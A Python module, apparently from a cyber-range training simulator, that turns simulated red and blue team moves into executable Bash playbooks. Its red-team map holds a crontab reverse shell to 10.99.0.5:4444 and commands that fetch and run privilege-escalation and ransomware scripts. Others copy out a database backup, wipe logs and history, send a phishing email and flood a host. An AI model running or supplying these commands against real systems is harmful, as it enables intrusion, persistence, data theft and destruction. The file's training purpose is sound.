"""
CyberDojo Sim-to-Real Execution Engine

Translates simulation events into executable real-world CLI scripts
(Bash/Ansible/Metasploit) that can be run against a real cyber range.
"""

import os
import json
from datetime import datetime
from typing import List, Dict

# Mapping of simulated Red Actions to real-world Bash commands
RED_COMMAND_MAP = {
    "scan_network": "nmap -sn 10.{subnet}.0.0/24 -oG scan_results_{subnet}.txt\ncat scan_results_{subnet}.txt | grep Up | awk '{{print $2}}' > live_hosts.txt",
    "scan_vulnerability": "nmap -sV --script vuln 10.{subnet}.0.{node_idx} -oN vuln_scan_{node}.txt",
    "exploit": "msfconsole -q -x 'use exploit/multi/handler; set RHOST 10.{subnet}.0.{node_idx}; exploit -j'\n# Manual execution required for specific CVE",
    "privilege_escalate": "ssh user@10.{subnet}.0.{node_idx} 'wget http://10.99.0.5/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh' # Enum for privesc",
    "lateral_move": "proxychains crackmapexec smb 10.{subnet}.0.0/24 -u Admin -p 'P@ssw0rd1!'",
    "install_backdoor": "ssh root@10.{subnet}.0.{node_idx} 'echo \"* * * * * root bash -c \\\"bash -i >& /dev/tcp/10.99.0.5/4444 0>&1\\\"\" >> /etc/crontab'",
    "exfiltrate_data": "scp -r root@10.{subnet}.0.{node_idx}:/var/lib/mysql/backup.sql ./exfil/",
    "cover_tracks": "ssh root@10.{subnet}.0.{node_idx} 'cat /dev/null > ~/.bash_history && rm -rf /var/log/*'",
    "deploy_ransomware": "ssh root@10.{subnet}.0.{node_idx} 'wget http://10.99.0.5/encrypt.sh; chmod +x encrypt.sh; ./encrypt.sh /data'",
    "phish_user": "swaks --to target@company.com --from hr@company.com --header \"Subject: Urgent Salary Update\" --body \"Click here: http://10.99.0.5/payload\"",
    "ddos_service": "hping3 -S --flood -V 10.{subnet}.0.{node_idx}",
    "wait": "# [RED] Wait and listen for C2 beacons",
}

# Mapping of simulated Blue Actions to real-world Bash commands
BLUE_COMMAND_MAP = {
    "monitor_traffic": "tcpdump -i eth0 host 10.{subnet}.0.{node_idx} -w capture_{node}.pcap &",
    "analyze_alert": "cat /var/log/suricata/fast.log | grep '10.{subnet}.0.{node_idx}'",
    "isolate_node": "iptables -A INPUT -s 10.{subnet}.0.{node_idx} -j DROP\niptables -A FORWARD -s 10.{subnet}.0.{node_idx} -j DROP",
    "patch_vulnerability": "ssh admin@10.{subnet}.0.{node_idx} 'apt-get update && apt-get upgrade -y'",
    "deploy_honeypot": "docker run -d -p 22:2222 cowrie/cowrie:latest",
    "restore_backup": "ssh admin@10.{subnet}.0.{node_idx} 'rsync -av /mnt/backups/{node}/ /data/'",
    "update_firewall": "ufw deny from 10.{subnet}.0.0/24 to any port 22",
    "forensic_analysis": "ssh root@10.{subnet}.0.{node_idx} 'volatility -f /tmp/memdump.raw windows.malfind'",
    "deploy_ids_rule": "echo 'alert tcp any any -> 10.{subnet}.0.0/24 any (msg:\"Custom Rule\"; sid:1000001;)' >> /etc/snort/rules/local.rules\nsystemctl restart snort",
    "wait": "# [BLUE] Continuous monitoring of SIEM dashboard",
}


def export_campaign(event_log: List[Dict], output_dir: str = "./sim2real_exports") -> None:
    """Consumes the battle event log and produces executable Bash playbooks."""
    if not event_log:
        return
        
    os.makedirs(output_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    red_playbook_path = os.path.join(output_dir, f"red_campaign_{timestamp}.sh")
    blue_playbook_path = os.path.join(output_dir, f"blue_campaign_{timestamp}.sh")
    
    # Extract nodes to map names to fake IP schema (10.[subnet].0.[idx])
    # Find the last network state to build the IP map
    ip_map = {}
    if event_log and "network_state" in event_log[-1]:
        nodes_data = event_log[-1]["network_state"].get("nodes", [])
        for n in nodes_data:
            node_idx = int(n["id"].split('-')[-1]) if '-' in n["id"] else 0
            # 10.subnet.0.node_idx
            ip_map[n["id"]] = {
                "subnet": n["subnet"],
                "node_idx": node_idx,
                "name": n["name"]
            }

    with open(red_playbook_path, "w") as f_red, open(blue_playbook_path, "w") as f_blue:
        f_red.write("#!/bin/bash\n# CyberDojo Red Team Execution Playbook\n")
        f_red.write(f"# Generated: {timestamp}\n\n")
        
        f_blue.write("#!/bin/bash\n# CyberDojo Blue Team Execution Playbook\n")
        f_blue.write(f"# Generated: {timestamp}\n\n")
        
        for event in event_log:
            step = event["step"]
            
            # --- RED PROCESSING ---
            r_action = event["red"]["action"]
            r_target_id = event["red"]["target"]
            
            f_red.write(f"echo \"[Step {step}] Executing {r_action} on {r_target_id}...\"\n")
            if r_action in RED_COMMAND_MAP:
                cmd = RED_COMMAND_MAP[r_action]
                
                # Format target vars if applicable
                if r_target_id in ip_map:
                    subnet = ip_map[r_target_id]['subnet']
                    node_idx = ip_map[r_target_id]['node_idx'] + 10  # offset so it's not .0 or .1
                    cmd = cmd.format(subnet=subnet, node_idx=node_idx, node=r_target_id)
                elif "{subnet}" in cmd or "{node" in cmd:
                    # Fallback
                    cmd = cmd.replace("{subnet}", "X").replace("{node_idx}", "Y").replace("{node}", r_target_id)
                    
                f_red.write(cmd + "\n\n")
            else:
                f_red.write(f"# Unmapped command: {r_action}\n\n")

            # --- BLUE PROCESSING ---
            b_action = event["blue"]["action"]
            b_target_id = event["blue"]["target"]
            
            f_blue.write(f"echo \"[Step {step}] Executing {b_action} on {b_target_id}...\"\n")
            if b_action in BLUE_COMMAND_MAP:
                cmd = BLUE_COMMAND_MAP[b_action]
                
                # Format target vars if applicable
                if b_target_id in ip_map:
                    subnet = ip_map[b_target_id]['subnet']
                    node_idx = ip_map[b_target_id]['node_idx'] + 10
                    cmd = cmd.format(subnet=subnet, node_idx=node_idx, node=b_target_id)
                elif "{subnet}" in cmd or "{node" in cmd:
                    cmd = cmd.replace("{subnet}", "X").replace("{node_idx}", "Y").replace("{node}", b_target_id)
                    
                f_blue.write(cmd + "\n\n")
            else:
                f_blue.write(f"# Unmapped command: {b_action}\n\n")
                
    print(f"\n  📝 Sim-to-Real Playbooks Generated:")
    print(f"     ➜ {red_playbook_path}")
    print(f"     ➜ {blue_playbook_path}")
